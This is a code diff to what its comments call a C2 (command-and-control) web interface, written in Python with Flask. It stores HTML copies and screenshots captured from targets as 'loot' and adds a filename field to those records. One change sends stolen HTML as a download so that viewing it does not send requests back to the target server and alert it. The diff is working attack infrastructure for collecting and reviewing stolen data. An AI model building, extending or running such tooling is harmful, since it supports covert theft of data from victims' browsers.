@@ -120,6 +120,8 @@ class HtmlCode(db.Model):
     url       = db.Column(db.String(100), nullable=False)
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
     code      = db.Column(db.Text)
+    fileName  = db.Column(db.String(100), nullable=False)
+
 
     def __repr__(self):
         return f'<Client {self.id}>'
@@ -193,9 +195,9 @@ class Event(db.Model):
 # User C2 UI session
 class User(UserMixin, db.Model):
     __table_name__ = 'user'
-    username      = db.Column(db.String, primary_key=True)
-    password      = db.Column(db.String, nullable=False)
-    authenticated = db.Column(db.Boolean, default=False)
+    username       = db.Column(db.String, primary_key=True)
+    password       = db.Column(db.String, nullable=False)
+    authenticated  = db.Column(db.Boolean, default=False)
 
     def is_active(self):
         # We don't need to deactivate user accounts, but
@@ -372,7 +374,18 @@ def sendIndex():
 @app.route('/loot/<path:path>')
 @login_required
 def sendLootFile(path):
-    return send_from_directory('loot', path)
+
+    # If HTML the user needs to download it the loot file, not render it
+    # Rendering the HTML copy in the browswer will likely hit the target server
+    # with CSS/JavaScript requests from our browser. No good. 
+    if "htmlCopy.html" in path:
+        # print("### We're serving up stolent HTML!")
+        return send_from_directory('loot', path, as_attachment=True)
+    else:
+        # Just display the screenshot in the browser, this is safe
+        # print("#### Serving up screenshot!")    
+        return send_from_directory('loot', path)
+
 
 
 @app.route('/login', methods=['POST', 'GET'])
@@ -494,7 +507,9 @@ def recordHTML(identifier):
         raise RuntimeError("Session HTML counter not found")
         quit()
 
-    with open ("./loot/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html", "w") as html_file:
+    lootFile = "./loot/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"
+
+    with open (lootFile, "w") as html_file:
         logEvent(identifier, "HTML Copy: " + str(htmlNumber) + "_htmlCopy.html")
         html_file.write(trapHTML)
         html_file.close()
@@ -502,7 +517,7 @@ def recordHTML(identifier):
 
     # Put it in the DB
     newHtml = HtmlCode(clientID=identifier, url=content['url'], 
-        code=content['html'])
+        code=content['html'], fileName = lootFile)
     db.session.add(newHtml)
     clientSeen(identifier)
     dbCommit()
@@ -719,7 +734,7 @@ def getClientHtml(key):
     # htmlData = {'url':htmlCode.url, 'code':escape(htmlCode.code)}
 
     # This one shouldn't be escaped
-    htmlData = {'url':htmlCode.url, 'code':htmlCode.code}
+    htmlData = {'url':htmlCode.url, 'code':htmlCode.code, 'fileName':htmlCode.fileName}
     
 
     return jsonify(htmlData)
